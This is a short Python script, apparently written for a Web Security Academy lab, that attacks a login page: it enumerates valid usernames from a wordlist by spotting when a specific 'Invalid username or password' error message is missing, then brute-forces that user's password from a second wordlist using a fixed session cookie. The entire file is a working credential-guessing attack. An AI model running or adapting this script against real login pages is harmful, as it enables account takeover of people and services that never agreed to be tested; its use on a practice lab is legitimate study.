import re
import requests


target = "https://acc71f501fe2e69cc0987f48008500a1.web-security-academy.net/login"
session_id = "SUhl2Gu0K9HDex60bpNrFVl73n6cS0pD"
session_cookie = {'session': session_id}

user_list = open('/opt/wordlists/pswigusers.txt', 'r')
users = [l.strip('\n') for l in user_list]
users.reverse()
pass_list = open('/opt/wordlists/passwords.txt', 'r')
passwords = [i.strip('\n') for i in pass_list]

def crack():
    found_user = ''
    found_pass = ''
    pattern = re.compile('>Invalid username or password\.<')
    for user in users:
        data = {'username': user, 'password': 'swag'}
        response = requests.post(target, cookies=session_cookie, data=data)
        match = re.search(pattern, response.text)
        print(response.status_code)
        if match == None:
            print(f'FOUND USER: {user}')
            found_user = user
            break
    for p in passwords:
        data = {'username': found_user, 'password': p}
        response = requests.post(target, cookies=session_cookie, data=data)
        if 'Invalid' not in response.text:
            print(f"FOUND PASS: {p}")
            found_pass = p
            break
    print(f'USERNAME: {found_user}, PASSWORD: {found_pass}')

crack()

